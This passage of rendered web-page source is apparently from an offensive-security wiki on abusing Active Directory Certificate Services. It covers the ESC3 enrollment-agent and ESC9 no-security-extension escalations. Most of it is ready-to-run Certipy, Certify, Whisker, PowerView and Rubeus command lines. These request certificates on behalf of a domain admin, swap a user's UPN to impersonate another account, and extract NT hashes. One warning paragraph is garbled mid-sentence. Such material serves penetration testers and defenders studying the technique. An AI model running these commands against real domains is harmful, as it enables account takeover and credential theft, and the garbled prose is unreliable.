"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ADCS_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'vulnerable template'")])])])],-1),i("p",null,[e("Then, the issued certificate can be used to request another certificate permitting "),i("code",null,"Client Authentication"),e(" on behalf of another user.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ADCS_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'User'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -on-behalf-of"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain\\domain admin'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -pfx"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'user.pfx'")])])])],-1),i("div",{class:"tip custom-block"},[i("p",null,[e("By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The "),i("code",null,"-scheme"),e(" flag can be used to set whether to use LDAP or LDAPS.")])],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[3]||(s[3]=[i("p",null,[e("From Windows systems, the "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),e(" (C#) tool can be used.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find vulnerable/abusable certificate templates using default low-privileged group")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," find "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"vulnerable")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," find "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"vulnerable "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"currentuser")])])])],-1),i("p",null,"Once a vulnerable template is found, a request shall be made to obtain a certificate specifying the Certificate Request Agent EKU.",-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'domain\\ca'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Vulnerable template"')])])])],-1),i("p",null,[e("Then, the issued certificate can be used to request another certificate permitting "),i("code",null,"Client Authentication"),e(" on behalf of another user.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'domain\\ca'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"User"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"onbehalfon:DOMAIN\\Admin "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"enrollcert:enrollmentAgentCert.pfx "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"enrollcertpw:Passw0rd"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"!")])])])],-1)])),_:1})]),_:1}),s[28]||(s[28]=n('<h3 id="esc9-no-security-extension" tabindex="-1">(ESC9) No security extension <a class="header-anchor" href="#esc9-no-security-extension" aria-label="Permalink to &quot;(ESC9) No security extension&quot;">​</a></h3><p>To understand this privilege escalation, it is recommended to know how certificate mapping is performed. It is presented in <a href="./certificate-templates#certificate-mapping">this section</a>.</p><p>If the certificate attribute <code>msPKI-Enrollment-Flag</code> contains the flag <code>CT_FLAG_NO_SECURITY_EXTENSION</code>, the <code>szOID_NTDS_CA_SECURITY_EXT</code> extension will not be embedded, meaning that even with <code>StrongCertificateBindingEnforcement</code> set to <code>1</code>, the mapping will be performed similarly as a value of <code>0</code> in the registry key.</p><p>Here are the requirements to perform ESC9:</p><ul><li><code>StrongCertificateBindingEnforcement</code> not set to <code>2</code> (default: <code>1</code>) or <code>CertificateMappingMethods</code> contains <code>UPN</code> flag (<code>0x4</code>)</li><li>The template contains the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag in the <code>msPKI-Enrollment-Flag</code> value</li><li>The template specifies client authentication</li><li><code>GenericWrite</code> right against any account A to compromise any account B</li></ul><div class="warning custom-block"><p>Acate can then be used with to obtain a TGT and authenticat the time of writting (06/08/2022), there is no solution as a low privileged user to read the <code>StrongCertificateBindingEnforcement</code> or the <code>CertificateMappingMethods</code> values. It is worth to try the attack hopping the keys are misconfigured.</p></div>',6)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>s[4]||(s[4]=[i("p",null,[e("From UNIX-like systems, "),i("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),e(" (Python) can be used to enumerate for, and conduct, the ESC9 scenario.")],-1),i("p",null,[e("In this scenario, user1 has "),i("code",null,"GenericWrite"),e(" against user2 and wants to compromise user3. user2 is allowed to enroll in a vulnerable template that specifies the "),i("code",null,"CT_FLAG_NO_SECURITY_EXTENSION"),e(" flag in the "),i("code",null,"msPKI-Enrollment-Flag"),e(" value.")],-1),i("p",null,[e("First, the user2's hash is needed. It can be retrieved via a "),i("a",{href:"./../kerberos/shadow-credentials"},"Shadow Credentials"),e(" attack, for example.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," shadow"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," auto"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user1@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -account"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user2")])])])],-1),i("p",null,[e("Then, the "),i("code",null,"userPrincipalName"),e(" of user2 is changed to user3.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," account"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," update"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user1@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user2"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -upn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user3")])])])],-1),i("p",null,"The vulnerable certificate can be requested as user2.",-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user2@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hash"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$NT_HASH"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ADCS_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'vulnerable template'")])])])],-1),i("p",null,"The user2's UPN is changed back to something else.",-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," account"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," update"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user1@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user2"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -upn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user2@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("p",null,[e("Now, authenticating with the obtained certificate will provide the user3's NT hash during "),i("a",{href:"./../kerberos/unpac-the-hash"},"UnPac the hash"),e(". The domain must be specified since it is not present in the certificate.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," auth"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -pfx"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'user3.pfx'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[5]||(s[5]=[i("p",null,[e("From Windows systems, the "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),e(" (C#) tool can be used.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find vulnerable/abusable certificate templates using default low-privileged group")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," find")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," find "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"currentuser")])])])],-1),i("p",null,[e("Here, user1 has "),i("code",null,"GenericWrite"),e(" against user2 and want to compromise user3. user2 is allowed to enroll in a vulnerable template that specifies the "),i("code",null,"CT_FLAG_NO_SECURITY_EXTENSION"),e(" flag in the "),i("code",null,"msPKI-Enrollment-Flag"),e(" value.")],-1),i("p",null,[e("First, the user2's credentials are needed. It can be retrieved via a "),i("a",{href:"./../kerberos/shadow-credentials"},"Shadow Credentials"),e(" attack, for example. Here just the "),i("code",null,"msDs-KeyCredentialLink"),e(" modification part with "),i("a",{href:"https://github.com/eladshamir/Whisker",target:"_blank",rel:"noreferrer"},"Whisker"),e(":")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Whisker.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," add "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"target:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"user2"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain.local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"dc:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DOMAIN_CONTROLLER"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"path:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"cert.pfx"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"pfx-password"')])])])],-1),i("p",null,[e("Then, the "),i("code",null,"userPrincipalName"),e(" of user2 is changed to user3 with "),i("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),e(".")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," user2 "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Set "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'userPrincipalName'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'user3'"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"} "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")])])])],-1),i("p",null,"The vulnerable certificate can be requested in a user2 session.",-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'domain\\ca'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Vulnerable template"')])])])],-1),i("p",null,"The user2's UPN is changed back to something else.",-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," user2 "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Set "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'userPrincipalName'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'user2@dmain.local'"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"} "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")])])])],-1),i("p",null,[e("Now, authenticating with the obtained certificate will provide the user3's NT hash during "),i("a",{href:"./../kerberos/unpac-the-hash"},"UnPac the hash"),e(". This action can be realised with "),i("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),e(". The domain must be specified since it is not present in the certificate.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," asktgt "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"getcredentials "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"certificate:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"BASE64_CERTIFICATE"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"CERTIFICATE_PASSWORD"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," 